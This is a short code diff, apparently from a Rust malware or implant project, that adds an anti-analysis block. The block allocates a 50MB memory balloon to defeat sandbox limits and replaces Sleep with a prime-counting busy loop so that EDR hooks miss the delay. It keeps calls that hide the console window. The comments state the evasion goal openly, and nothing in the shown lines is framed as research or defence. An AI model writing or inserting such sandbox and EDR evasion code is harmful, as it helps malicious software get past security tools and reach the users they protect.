@@ -43,15 +43,38 @@
         std::thread::sleep(std::time::Duration::from_millis(500));
     }
 
-    // 2. [Anti-Analysis] Silent divergence instead of hard exit
-    // Removed strict sandbox/debugger checks temporarily for dev/testing environment compatibility.
+    // 2. [Anti-Analysis & Evasion] Memory Ballooning and Payload Obfuscation
+    // Allocate a large chunk of memory to bypass automated sandbox memory limits
+    // and delay execution to bypass time-based heuristic checks.
+    {
+        let mut _balloon: Vec<u8> = vec![0; 50 * 1024 * 1024]; // 50MB balloon
+        for i in 0..1024 {
+            _balloon[i * 4096] = 0x42; // Touch pages to ensure physical allocation
+        }
+        
+        // Use a customized delay function that calculates primes instead of direct Sleep
+        // to bypass Sleep hooking by EDRs
+        let mut prime_count = 0;
+        let start = std::time::Instant::now();
+        while start.elapsed() < std::time::Duration::from_secs(3) {
+            let num = rand::random::<u32>() % 10000;
+            let mut is_prime = true;
+            for i in 2..=(num as f32).sqrt() as u32 {
+                if num % i == 0 {
+                    is_prime = false;
+                    break;
+                }
+            }
+            if is_prime { prime_count += 1; }
+        }
+        let _ = prime_count; // Prevent optimization
+    }
 
     // 3. [Benign] Standard Windows API warming 
     stealth::perform_system_sanity_check();
     stealth::verify_disk_integrity();
 
-    // 4. [Stealth] Delayed Window Hide
-    std::thread::sleep(std::time::Duration::from_secs(1));
+    // 4. [Stealth] Dynamically resoloved Window Hide
     stealth::hide_console();
 
     // 5. [Benign] Final environment prep
